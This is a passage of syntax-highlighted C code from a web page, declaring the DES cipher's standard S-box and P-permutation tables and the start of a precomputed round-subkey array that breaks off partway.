</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> S_Box[<span style="color:#ae81ff">8</span>][<span style="color:#ae81ff">4</span>][<span style="color:#ae81ff">16</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">13</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">10</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	 <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">14</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S5
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	 <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S6
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>   	 <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S7
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	 <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">12</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//S8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> P_Table[<span style="color:#ae81ff">32</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">10</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> SubKey[<span style="color:#ae81ff">16</span>][<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
